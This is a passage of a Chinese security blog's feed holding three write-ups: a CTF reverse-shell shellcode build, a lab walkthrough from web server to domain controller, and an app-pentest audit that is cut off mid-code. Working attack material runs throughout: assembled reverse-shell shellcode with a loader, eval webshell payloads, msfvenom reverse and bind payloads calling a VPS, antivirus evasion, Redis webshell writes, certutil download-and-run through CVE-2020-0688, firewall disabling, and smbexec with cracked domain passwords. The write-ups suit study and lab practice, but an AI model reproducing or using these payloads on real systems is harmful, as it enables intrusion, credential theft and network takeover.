class="built_in">printf</span>(<span class="string">&quot;sockaddr_in addr: 0x%llx\n&quot;</span>, &amp;remoteAddress);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sockaddr_in content: 0x%llx\n&quot;</span>, remoteAddress);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sockaddr_in.sin_family: 0x%lx\n&quot;</span>, remoteAddress.sin_family);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sockaddr_in.sin_addr.s_addr: 0x%lx\n&quot;</span>, remoteAddress.sin_addr.s_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sockaddr_in.sin_port: 0x%lx\n&quot;</span>, remoteAddress.sin_port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230907172850614.png" alt="image-20230907172850614"></p>
<p>最后来写shellcode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// socket(2, 1, 0);</span></span><br><span class="line"><span class="string">mov rdi, 2;</span></span><br><span class="line"><span class="string">mov rsi, 1;</span></span><br><span class="line"><span class="string">xor rdx, rdx;</span></span><br><span class="line"><span class="string">mov rax, 0x29;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connect(clientSocket, &amp;remoteAddress, 0x10);</span></span><br><span class="line"><span class="string">mov rdi, rax;</span></span><br><span class="line"><span class="string">mov rax, 0x86d7a8c0b3150002;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">push rsp;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">mov rdx, 0x10;</span></span><br><span class="line"><span class="string">mov rax, 0x2a;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// dup2(clientSocket, 2);</span></span><br><span class="line"><span class="string">// dup2(clientSocket, 1);</span></span><br><span class="line"><span class="string">// dup2(clientSocket, 0);</span></span><br><span class="line"><span class="string">mov rsi, 2;</span></span><br><span class="line"><span class="string">mov rax, 0x21;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rsi, 1;</span></span><br><span class="line"><span class="string">mov rax, 0x21;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rsi, 0;</span></span><br><span class="line"><span class="string">mov rax, 0x21;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// execve(&quot;/bin/sh&quot;, 0, 0);</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">push rsp;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">xor rdx, rdx;</span></span><br><span class="line"><span class="string">mov rax, 0x3b;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br></pre></td></tr></table></figure>

<p>别忘了编译的时候关闭NX。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc shellcode.c -g -z execstack -o shellcode</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;H\xc7\xc7\x02\x00\x00\x00H\xc7\xc6\x01\x00\x00\x00H1\xd2H\xc7\xc0)\x00\x00\x00\x0f\x05H\x89\xc7H\xb8\x02\x00\x15\xb3\xc0\xa8\xd7\x86PT^H\xc7\xc2\x10\x00\x00\x00H\xc7\xc0*\x00\x00\x00\x0f\x05H\xc7\xc6\x02\x00\x00\x00H\xc7\xc0!\x00\x00\x00\x0f\x05H\xc7\xc6\x01\x00\x00\x00H\xc7\xc0!\x00\x00\x00\x0f\x05H\xc7\xc6\x00\x00\x00\x00H\xc7\xc0!\x00\x00\x00\x0f\x05H\xb8/bin/sh\x00PT_H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))&amp;shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>领航杯</tag>
      </tags>
  </entry>
  <entry>
    <title>从外网打点到内网域渗透实战</title>
    <url>/2023/08/30/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81%E4%B8%80/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学习采用的是暗月项目十一，最终也是跟着暗月佬拿下了四台主机。</p>
<ul>
<li>Web服务器：利用sqlmap拿到管理员密码，找到宝塔配置文件绕过disable_functions。利用frp实现反向代理。利用网上最新的项目尝试绕过最新版火绒，最终成功。</li>
<li>Redis数据库：利用hydra进行redis密码的爆破，同时写webshell拿到权限，利用printspoofer进行提权。</li>
<li>Exchange服务器：从pst文件中找到Exchange用户和密码，利用CVE-2020-0688拿到Exchange服务器的shell，域内信息收集获取到域控密码的hash。</li>
<li>DC域控：利用smbexec进行域控的登录。</li>
</ul>
<span id="more"></span>

<h2 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h2><p>登录网页查看收集信息，发现是火云工作室出品，<code>http://www.hphu.com</code>，尝试网上找源码和漏洞。很遗憾没能找到漏洞点，看一下暗月佬的WP，发现在<code>/kss_inc/payapi_return2.php</code>存在sql注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$HY_16820507ed954ab95b</span>=<span class="variable">$HY_b7b9616c94325ef3b4</span>-&gt;<span class="title function_ invoke__">HY_a41e6c8e01c4b6e81a</span>(<span class="string">&#x27;select * from kss_tb_order where ordernum=\&#x27;&#x27;</span>.<span class="variable">$HY_f25124089abd2a0f81</span>.<span class="string">&#x27;\&#x27;&#x27;</span> );</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$HY_16820507ed954ab95b</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">HY_e939160b6236eee504</span>(<span class="string">&#x27;订单未找到！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230822170950615.png" alt="image-20230822170950615"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230822171020451.png" alt="image-20230822171020451"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230822173755993.png" alt="image-20230822173755993"></p>
<p>进入后台尝试执行sql语句拿shell，但是没能成功，应该是权限不够。看看系统设置，和源码进行比对，发现将配置的信息都写到了php文件里，而不是添加到数据库中，那么接下来拿shell就很方便了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230822174614020.png" alt="image-20230822174614020"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);eval($_POST[&#x27;cmd&#x27;]);/*</span><br></pre></td></tr></table></figure>

<p>成功登陆到蚁剑，但是仍然需要绕过宝塔的disable_functions。找到宝塔输出平台入口、用户名和密码的脚本文件，路径为<code>C:/BtSoft/panel/script/bt.bat</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo %panel_path%</span><br><span class="line">set /p port=&lt;%panel_path%\data\port.pl					# 8888</span><br><span class="line">set /p password=&lt;%panel_path%\data\default.pl				# jSKyFFdj</span><br><span class="line">set /p admin_path=&lt;%panel_path%\data\admin_path.pl				# /e1VOsmtO</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;%panel_path%\data\default.db							<span class="comment"># gOXZQjWA</span></span></span><br></pre></td></tr></table></figure>

<p>进入到宝塔面板，可以进行计划任务的执行，同时查看文件发现火绒。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230828125746505.png" alt="image-20230828125746505"></p>
<p>由于模拟实战，所以需要一台vps做反向代理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frps.ini</span><br><span class="line">---------------------------------</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">---------------------------------</span><br><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frpc.ini</span><br><span class="line">---------------------------------</span><br><span class="line">[common]</span><br><span class="line">server_addr = 149.28.239.217</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6000</span><br><span class="line">remote_port = 6000</span><br><span class="line">---------------------------------</span><br><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<p><strong>注意防火墙要开放端口</strong>，我的vps是ubuntu的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw status</span><br><span class="line">sudo ufw allow 7000</span><br><span class="line">sudo ufw delete allow 80</span><br></pre></td></tr></table></figure>

<p>接下来就是免杀火绒了，更新后最新版本是<code>5.0.73.13</code>，github上找到一个项目不过兼容做得不好，环境比较难配置，我这里用的是python3.9生成的木马，测试下来只能作用在x64的系统中。</p>
<blockquote>
<p><a href="https://github.com/shellfeel/Ant-AntV">shellfeel&#x2F;Ant-AntV: 一个经过实战考验的免杀程序生成器 </a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=149.28.239.217 LPORT=6000 -f raw -o beacon.bin</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 127.0.0.1</span><br><span class="line">set lport 6000</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830171906812.png" alt="image-20230830171906812"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830171913805.png" alt="image-20230830171913805"></p>
<p>通过NTML解密拿到明文密码：QWEasd444。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830174036508.png" alt="image-20230830174036508"></p>
<h2 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.215.150 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830175625349.png" alt="image-20230830175625349"></p>
<p>尝试利用hydra对数据库进行弱口令爆破，直接用kali自带的<code>rockyou.txt</code>字典进行爆破。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.215.150 -t 10 -o redis.txt -vV</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830183737313.png" alt="image-20230830183737313"></p>
<p>连接redis服务器，尝试写webshell拿权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.215.150</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir C:/inetpub/wwwroot					# IIS</span><br><span class="line">set xxx &quot;\n\n\n&lt;%eval request(\&quot;cmd\&quot;)%&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename shell.asp</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830185134479.png" alt="image-20230830185134479"></p>
<p>权限比较低需要提权，发现是Windows Server 2012，那么可以用之前的<code>PrintSpoofer</code>进行提权。</p>
<blockquote>
<p><a href="https://github.com/dievus/printspoofer">dievus&#x2F;printspoofer (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830194154567.png" alt="image-20230830194154567"></p>
<p>这里在实战情况下是不出网的，所以采用正向连接的方式，需要开启防火墙的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off			# 关闭防火墙</span><br><span class="line">netsh advfirewall firewall show rule name=all		# 查看所有端口信息</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;msf&quot; dir=in action=allow protocol=TCP localport=8899		# 添加</span><br><span class="line">netsh advfirewall firewall delete rule name=&quot;msf&quot; protocol=tcp localport=8899		# 删除</span><br></pre></td></tr></table></figure>

<p>接下来就是做一个正向的马：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=8899 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830203434702.png" alt="image-20230830203434702"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830204420471.png" alt="image-20230830204420471"></p>
<h2 id="Exchange服务器"><a href="#Exchange服务器" class="headerlink" title="Exchange服务器"></a>Exchange服务器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.10.209 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830205630243.png" alt="image-20230830205630243"></p>
<p>从端口开放的程度来看可能是一个Exchange服务器。</p>
<p>pst文件是outlook数据文件，里面包含了outlook中邮箱配置的所有信息，包括收到邮件，发送邮件，联系人等信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830213025544.png" alt="image-20230830213025544"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830214315241.png" alt="image-20230830214315241"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830214620034.png" alt="image-20230830214620034"></p>
<p>尝试用<code>CVE-2020-0688</code>拿权限。</p>
<blockquote>
<p><a href="https://github.com/Yt1g3r/CVE-2020-0688_EXP">Yt1g3r&#x2F;CVE-2020-0688_EXP(github.com)</a></p>
</blockquote>
<p>注意一下该CVE的提权需要在windows上进行，并且是没有回显的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python CVE-2020-0688_EXP.py -s https://10.10.10.209/owa -u moonsec@cncat.cc -p QQqq5201314 -c &quot;cmd /c certutil -urlcache -split -f http://10.10.10.128/bind.exe C:\Windows\Temp\bind.exe&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd /c certutil -urlcache -split -f http://10.10.10.128/bind.exe C:\Windows\Temp\bind.exe</span><br><span class="line">cmd /c netsh firewall add portopening tcp 8899 msf</span><br><span class="line">cmd /c C:\Windows\Temp\bind.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830225457591.png" alt="image-20230830225457591"></p>
<p>通过ps看进程发现还是域管理员，直接迁移进程拿域内信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830225855335.png" alt="image-20230830225855335"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830230300482.png" alt="image-20230830230300482"></p>
<p>我们可以拿到域管理员的hash，破解后得到密码为QWEasd123。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830231227127.png" alt="image-20230830231227127"></p>
<h2 id="DC域控"><a href="#DC域控" class="headerlink" title="DC域控"></a>DC域控</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.10.201 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830214635106.png" alt="image-20230830214635106"></p>
<p>既然拿到了域控的密码直接通过smbexec登录。</p>
<blockquote>
<p><a href="https://github.com/fortra/impacket/tree/master">fortra&#x2F;impacket(github.com)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python smbexec.py cncat/administrator:QWEasd123@10.10.10.201</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830232543866.png" alt="image-20230830232543866"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>初探APP渗透</title>
    <url>/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/</url>
    <content><![CDATA[<p>修改模拟器的hosts文件，雷电似乎不可以，用的是夜神。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb pull /system/etc/hosts</span><br><span class="line">adb push hosts /system/etc/hosts</span><br></pre></td></tr></table></figure>

<p>服务器开启ping命令检测是否可以连通：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh firewall set icmpsetting 8</span><br></pre></td></tr></table></figure>

<p>设置代理然后用Fiddler抓包，拿到域名直接浏览器访问即可。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230812142412272.png" alt="image-20230812142412272"></p>
<span id="more"></span>

<p>进行端口扫描和信息的收集，发现是宝塔面板搭建的网站。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230812145524979.png" alt="image-20230812145524979"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230812145534463.png" alt="image-20230812145534463"></p>
<p>目录扫描，用dirsearch和gobuster都没能扫出有用的，选择暗月佬推荐的项目，可以根据域名等进行fuzz，可以拿到源代码。</p>
<blockquote>
<p><a href="https://github.com/Mosuan/FileScan">Mosuan&#x2F;FileScan: FileScan</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230812151644071.png" alt="image-20230812151644071"></p>
<p>重构网站，导入数据库，动态调试寻找漏洞，通过代码审计，发现<code>/install/index.php</code>具有重写<code>/config.php</code>的功能，而且没有进行过滤。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$config_file_name</span> = <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;install&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sql_host&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_pass&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_name&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>()) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$con</span>) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      $sql = mysqli_query($con, &quot;SELECT @<span class="doctag">@sql</span>_mode as modes;&quot;);</span></span><br><span class="line"><span class="comment">      $sql_sql = mysqli_fetch_assoc($sql);</span></span><br><span class="line"><span class="comment">      if (count($sql_sql) &gt; 0) &#123;</span></span><br><span class="line"><span class="comment">         $results = <span class="doctag">@explode</span>(&#x27;,&#x27;, $sql_sql[&#x27;modes&#x27;]);</span></span><br><span class="line"><span class="comment">         if (in_array(&#x27;STRICT_TRANS_TABLES&#x27;, $results)) &#123;</span></span><br><span class="line"><span class="comment">           $ServerErrors[] = &quot;The sql-mode &lt;b&gt;STRICT_TRANS_TABLES&lt;/b&gt; is enabled in your mysql server, please contact your host provider to disable it.&quot;;</span></span><br><span class="line"><span class="comment">         &#125;</span></span><br><span class="line"><span class="comment">         if (in_array(&#x27;STRICT_ALL_TABLES&#x27;, $results)) &#123;</span></span><br><span class="line"><span class="comment">           $ServerErrors[] = &quot;The sql-mode &lt;b&gt;STRICT_ALL_TABLES&lt;/b&gt; is enabled in your mysql server, please contact your host provider to disable it.&quot;;</span></span><br><span class="line"><span class="comment">         &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;site_url&#x27;</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Invalid site url&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_username&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_password&#x27;</span>])) &#123;</span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Please provide right admin username/password&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$p</span> = <span class="title function_ invoke__">check_</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;purshase_code&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$p</span>[<span class="string">&#x27;status&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$p</span>[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;ERROR&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ServerErrors</span>[] = <span class="variable">$p</span>[<span class="string">&#x27;ERROR_NAME&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$ServerErrors</span>[] = <span class="string">&#x27;Failed to connect to server, please try again later, or contact us.&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//if ($ServerErrors) &#123;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$ServerErrors</span>)) &#123;</span><br><span class="line">      <span class="variable">$file_content</span> = </span><br><span class="line"><span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// | @author Deen Doughouz (DoughouzForest)</span></span><br><span class="line"><span class="string">// | @author_url 1: http://www.playtubescript.com</span></span><br><span class="line"><span class="string">// | @author_url 2: http://codecanyon.net/user/doughouzforest</span></span><br><span class="line"><span class="string">// | @author_email: wowondersocial@gmail.com   </span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// | PlayTube - The Ultimate Video Sharing Platform</span></span><br><span class="line"><span class="string">// | Copyright (c) 2017 PlayTube. All rights reserved.</span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// MySQL Hostname</span></span><br><span class="line"><span class="string">$sql_db_host = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_host&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database User</span></span><br><span class="line"><span class="string">$sql_db_user = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_user&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database Password</span></span><br><span class="line"><span class="string">$sql_db_pass = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_pass&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database Name</span></span><br><span class="line"><span class="string">$sql_db_name = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_name&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Site URL</span></span><br><span class="line"><span class="string">$site_url = &quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;site_url&#x27;</span>] . <span class="string">&#x27;&quot;; // e.g (http://example.com)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Purchase code</span></span><br><span class="line"><span class="string">$purchase_code = &quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;purshase_code&#x27;</span>] . <span class="string">&#x27;&quot;; // Your purchase code, don\&#x27;t give it to anyone. </span></span><br><span class="line"><span class="string">?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$success</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config_file</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$config_file_name</span>, <span class="variable">$file_content</span>);			<span class="comment">// 写入 webshell</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是保证数据库能够正常连接，这里在Kali上开启服务，注意版本之间的差别。</p>
<blockquote>
<p><a href="https://blog.csdn.net/u014101410/article/details/104687131">kali 2020.1 开启mysql远程访问</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230812224026295.png" alt="image-20230812224026295"></p>
<p>成功写入<code>config.php</code>，并成功上线蚁剑。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | @author Deen Doughouz (DoughouzForest)</span></span><br><span class="line"><span class="comment">// | @author_url 1: http://www.playtubescript.com</span></span><br><span class="line"><span class="comment">// | @author_url 2: http://codecanyon.net/user/doughouzforest</span></span><br><span class="line"><span class="comment">// | @author_email: wowondersocial@gmail.com   </span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | PlayTube - The Ultimate Video Sharing Platform</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2017 PlayTube. All rights reserved.</span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// MySQL Hostname</span></span><br><span class="line"><span class="variable">$sql_db_host</span> = <span class="string">&quot;192.168.215.133&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database User</span></span><br><span class="line"><span class="variable">$sql_db_user</span> = <span class="string">&quot;pursue&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database Password</span></span><br><span class="line"><span class="variable">$sql_db_pass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database Name</span></span><br><span class="line"><span class="variable">$sql_db_name</span> = <span class="string">&quot;information_schema&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Site URL</span></span><br><span class="line"><span class="variable">$site_url</span> = <span class="string">&quot;http://www.a123.com&quot;</span>; <span class="comment">// e.g 